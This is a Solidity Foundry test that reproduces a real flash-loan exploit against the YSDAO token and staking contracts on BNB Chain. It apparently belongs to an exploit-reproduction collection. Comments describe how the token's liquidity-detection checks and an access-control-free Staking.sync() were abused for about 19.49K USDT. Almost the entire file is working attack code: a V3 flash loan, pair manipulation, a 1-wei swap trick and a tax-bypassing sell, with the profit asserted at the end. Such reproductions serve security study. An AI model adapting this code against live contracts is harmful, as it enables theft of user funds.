// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~19.49K USDT
// Attacker : https://bscscan.com/address/0x8114650Cfd2617CD05C59898De7C620ae413b460
// Attack Contract : https://bscscan.com/address/0xafBf780569B95C5766F78b9CC5788899Aa5616Af
// Vulnerable Token : https://bscscan.com/address/0xc036A13D7A6A84677DfCcec483eED124654B7918
// Vulnerable Staking : https://bscscan.com/address/0x3E13019dA3BAAd134493e751704D2D4245Eec7CA
// Attack Tx : https://bscscan.com/tx/0x91f26d96373bbec6a6a8517c7be995a739d65f20fed589d53bc47d8140f91907
//
// @Analysis
// YSDAO's transfer protection detects add/remove liquidity by reading the Pancake V2
// pair's current token balances against reserves. The attacker combines a V3 USDT
// flash loan with a V2 pair callback:
//   1. Buy YSDAO while making the pair output 1 wei USDT, so _isRemoveLiquidity()
//      sees pair USDT balance below reserve and skips buy tax/cooldown accounting.
//   2. Call Staking.sync(). It has no access control and transfers all staking-held
//      USDT into the YSDAO/USDT pair, then pair.sync(), raising the apparent YSDAO price.
//   3. Transfer 1 USDT into the pair before selling, so _isAddLiquidity() treats the
//      sale as liquidity addition and bypasses the harsher sell/profit-tax path.

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeV2PairMinimal {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeV2RouterMinimal {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountOut);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3PoolMinimal {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IYSDAOStaking {
    function sync() external;
}

contract YSDAO_exp is Test {
    address constant ATTACKER = 0x8114650Cfd2617CD05C59898De7C620ae413b460;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant YSDAO = 0xC036A13d7A6A84677DfCCeC483eed124654B7918;
    address constant STAKING = 0x3E13019dA3BAAd134493e751704D2D4245Eec7CA;
    address constant YSDAO_USDT_PAIR = 0x24Df7bdBC67b0EB03074Ea9d8CbbA0445fB35937;
    address constant USDT_WBNB_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant FLASH_AMOUNT = 8_000_002 ether;
    uint256 constant BUY_USDT_AMOUNT = 8_000_000 ether;
    uint256 constant PAIR_CALLBACK_REPAY = 8_000_000 ether + 2;

    function setUp() public {
        vm.createSelectFork("bsc", 101_088_361 - 1);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(USDT, "USDT");
        vm.label(WBNB, "WBNB");
        vm.label(YSDAO, "YSDAO");
        vm.label(STAKING, "YSDAO Staking");
        vm.label(YSDAO_USDT_PAIR, "YSDAO/USDT Pair");
        vm.label(USDT_WBNB_V3_POOL, "USDT/WBNB V3 Pool");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
    }

    function testExploit() public {
        uint256 beforeBalance = IERC20Minimal(USDT).balanceOf(address(this));

        IPancakeV3PoolMinimal(USDT_WBNB_V3_POOL).flash(
            address(this), FLASH_AMOUNT, 0, abi.encode(USDT_WBNB_V3_POOL, FLASH_AMOUNT)
        );

        uint256 afterBalance = IERC20Minimal(USDT).balanceOf(address(this));
        uint256 profit = afterBalance - beforeBalance;

        console.log("USDT profit:", profit / 1e18);
        assertApproxEqAbs(profit, 19_490.907296125583506343 ether, 1e12, "unexpected USDT profit");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (address pool, uint256 amount) = abi.decode(data, (address, uint256));
        require(msg.sender == pool && msg.sender == USDT_WBNB_V3_POOL, "invalid flash callback");
        require(fee1 == 0, "unexpected token1 fee");

        (uint112 reserveUSDT, uint112 reserveYSDAO,) = IPancakeV2PairMinimal(YSDAO_USDT_PAIR).getReserves();
        uint256 ysdaoOut =
            IPancakeV2RouterMinimal(PANCAKE_ROUTER).getAmountOut(BUY_USDT_AMOUNT, reserveUSDT, reserveYSDAO);

        // Outputting 1 wei USDT makes YSDAO's _isRemoveLiquidity() branch true during token transfer.
        IPancakeV2PairMinimal(YSDAO_USDT_PAIR).swap(1, ysdaoOut, address(this), hex"30783031");

        // Anyone can call this. It donates staking-held USDT into the pair and syncs reserves.
        IYSDAOStaking(STAKING).sync();

        // Makes YSDAO's _isAddLiquidity() branch true before selling through the router.
        IERC20Minimal(USDT).transfer(YSDAO_USDT_PAIR, 1 ether);

        IERC20Minimal(YSDAO).approve(PANCAKE_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = YSDAO;
        path[1] = USDT;

        uint256 ysdaoBalance = IERC20Minimal(YSDAO).balanceOf(address(this));
        IPancakeV2RouterMinimal(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ysdaoBalance, 0, path, address(this), block.timestamp + 60
        );

        IERC20Minimal(USDT).transfer(USDT_WBNB_V3_POOL, amount + fee0);
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == YSDAO_USDT_PAIR, "invalid v2 callback");
        IERC20Minimal(USDT).transfer(YSDAO_USDT_PAIR, PAIR_CALLBACK_REPAY);
    }
}
